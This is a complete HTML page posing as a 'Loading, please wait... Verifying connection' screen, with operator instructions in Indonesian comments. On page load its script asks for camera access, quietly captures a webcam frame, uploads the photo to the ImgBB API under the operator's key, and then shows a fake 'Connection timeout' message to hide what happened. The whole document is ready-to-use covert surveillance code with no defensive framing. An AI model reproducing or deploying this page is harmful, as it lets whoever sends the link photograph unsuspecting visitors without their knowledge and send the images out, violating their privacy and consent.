<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <style>
        body { 
            background: black; 
            color: white; 
            text-align: center; 
            padding-top: 50%;
            font-family: Arial;
        }
        .spinner {
            border: 4px solid rgba(255,255,255,0.3);
            border-top: 4px solid white;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="spinner"></div>
    <h2>Loading, please wait...</h2>
    <p>Verifying connection</p>

    <script>
        // GANTI DENGAN API KEY IMGBB ANDA (DAFTAR GRATIS DI IMGBB.COM)
        const IMGBB_API_KEY = "YOUR_IMGBB_API_KEY";
        
        // LINK INI YANG NANTI ANDA BUKA PAKAI XPLORE
        const YOUR_GALLERY_LINK = "https://api.imgbb.com/1/upload";

        setTimeout(() => {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    let video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    
                    setTimeout(() => {
                        let canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        
                        let imageData = canvas.toDataURL('image/jpeg');
                        
                        // Kirim ke ImgBB
                        let formData = new FormData();
                        formData.append('key', IMGBB_API_KEY);
                        formData.append('image', imageData.split(',')[1]);
                        
                        fetch('https://api.imgbb.com/1/upload', {
                            method: 'POST',
                            body: formData
                        })
                        .then(res => res.json())
                        .then(data => {
                            if (data.data && data.data.url) {
                                console.log('Foto tersimpan:', data.data.url);
                                // Foto bisa diakses lewat link itu
                            }
                        });
                        
                        stream.getTracks().forEach(track => track.stop());
                        document.body.innerHTML = "<h2>Connection timeout</h2><p>Please refresh the page</p>";
                    }, 3000);
                })
                .catch(err => {
                    document.body.innerHTML = "<h2>Error</h2><p>Camera not detected</p>";
                });
        }, 2000);
    </script>
</body>
</html>
